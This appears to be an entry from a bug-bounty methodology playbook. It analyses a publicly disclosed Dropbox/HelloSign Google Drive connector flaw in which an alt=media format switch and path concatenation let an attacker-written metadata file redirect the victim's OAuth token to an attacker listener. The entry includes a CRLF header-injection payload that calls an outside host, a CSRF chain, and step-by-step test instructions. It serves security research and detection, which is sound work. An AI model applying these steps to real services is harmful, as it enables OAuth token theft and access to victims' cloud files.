### [Bugbountyskills.md] 17.280 A CLOUD-DRIVE CONNECTOR'S SERVER-SIDE FETCH IS A TOKEN DELIVERY SERVICE: the user's file id is CONCATENATED into the provider API path and the provider's OWN response-format switch (`alt=media`) returns the FILE'S BYTES where the app expects file METADATA — so the attacker authors the JSON the app parses, repoints `downloadUrl` at their server, and receives the victim's OAuth access token in the `Authorization` header (one unauthenticated CSRF link does it to any visitor) (Dropbox + HelloSign Google-Drive integration, HackerOne #1406938 $17,576 and #1468010 $1,728; writeup by @rootxharsh / HTTPVoid, read 2026-11-08)

STATUS: UNVERIFIED (not reproduced — no Dropbox/HelloSign Google-Drive connector was available to test; mechanism read first-hand in the credited writeup this pass, plus the report's own public summary line recovered from the archived HackerOne HTML `og:description`)
CLASS/METHOD: the connector is shaped `GET /cloud/gdrive/fetch?file_id=<id>&access_token=<token>` → backend `requests.get('https://www.googleapis.com/drive/v2/files/' + file_id, headers={'Authorization': 'Bearer ' + token})` → `json.loads(r.text)['downloadUrl']` → a SECOND server-side fetch of that URL with the same Bearer token. Two attacker levers: (1) `file_id` is concatenated into the upstream PATH, so a path traversal plus query parameters reach the provider URL; (2) Google's own `alt=media` parameter makes the provider serve the FILE'S CONTENT instead of the file-metadata JSON — so a `file_id` of `<your_file_id>?alt=media` returns a file the ATTACKER wrote, and since the app parses that as metadata and fetches the `downloadUrl` inside it, the app's next request goes to the attacker's host carrying the VICTIM'S `Authorization: Bearer <token>` (writeup: "There's this magic parameter \"alt=media\" which would serve the file itself rather than the JSON object and now if the application is relaying on parsing the JSON and extracting \"downloadUrl\", we have control over it"). Where the app only concatenates the path and does not accept query params, the same chain is built with CRLF in any JSON field that later lands in a HEADER plus request pipelining: `{"fileId":"test","fileName":"test","authToken":"x\r\nSSRF:http://rce.ee/aaaaazzzzza\r\nConnection:keep-alive\r\n\r\nGET /drive/v2/files/<id>?alt=media HTTP/1.1\r\nHost:www.googleapis.com\r\nAuthorization: Bearer ***","fileType":"slides"}`. The CSRF link (#1468010's own summary, verbatim): "An attacker could exploit this vulnerability by getting a user to visit a specially-crafted link that set a parameter to redirect their Google OAuth token to the attacker."
DETECTION SIGNAL: any import/preview/render/download/attach endpoint whose parameter (`file_id`, `document_id`, `resource_id`, `drive_id`, `attachment_ref`) is concatenated into an upstream provider URL, with the caller's own `access_token` visible in the request or in the link the UI generates; a connector that PARSES an upstream JSON and then fetches a URL taken FROM that JSON (`downloadUrl`, `url`, `webContentLink`, `thumbnailLink`); a provider-side format switch (`alt=media`, `?format=raw`, `export=download`) that converts metadata into raw bytes; any JSON field that ends up in a request HEADER (CRLF → header/body control).
CHAIN: attacker-crafted link with no CSRF token on the integration page (primitive: the victim's own session and token, zero attacker privilege) → the victim visiting it drives the server-side Drive fetch as them → the injected `?alt=media` makes the provider return ATTACKER-WRITTEN BYTES where the connector expects file METADATA (primitive: response-format confusion / JSON injection into the app's parser) → the connector follows the attacker's `downloadUrl` and sends `Authorization: Bearer <victim's Drive token>` to the attacker's server (escalation: third-party OAuth credential theft) → the stolen token is used directly against Google's API for full read of the victim's Drive (impact: cross-provider account access; $17,576 for the SSRF form, $1,728 for the CSRF form).
TRANSFERABLE TEST: find the integration that fetches a third-party document server-side with the user's token and a path-concatenated id, then (a) append the provider's format switch to the id (`file_id=<your_id>?alt=media`), (b) upload a file whose CONTENT is that provider's metadata JSON with the URL field (`downloadUrl`/`url`) pointing at your listener, (c) trigger the fetch and check your listener for the token in the `Authorization` header — a hit is credential theft, not merely SSRF. If the id is not query-injectable, hunt CRLF in every JSON field that reaches a HEADER and pipeline the extra query parameter. RULE: wherever an app holds the USER's third-party token, the "SSRF" is systematically an OAuth-token exfiltration — and test the provider's response-format switch BEFORE hunting an open redirect, because controlling the response body is already enough.
WHY IT IS A NEW GENERAL METHOD: every SSRF entry in this playbook is URL-parameter/importer/webhook/renderer shaped and is judged by INTERNAL REACH; none covers a connector that (i) sends the victim's own third-party token on the second hop, so the impact is CREDENTIAL THEFT rather than internal browsing, and (ii) is steered by the PROVIDER's response-format parameter, so the attacker controls the JSON the app parses and therefore the URL it fetches next — the reusable rule being "when an app parses a document-provider's metadata and then fetches a URL from it, own the parsed document, not the URL". Dedupe across all three write targets: `alt=media` 0, `downloadUrl` 0, `drive/v2/files` 0, `GDrive` 1/1/0 (an incidental mention), `file_id` 1/1/1 (the unrelated Phabricator `{F<file_id>}` attachment-syntax entry, §17.272).
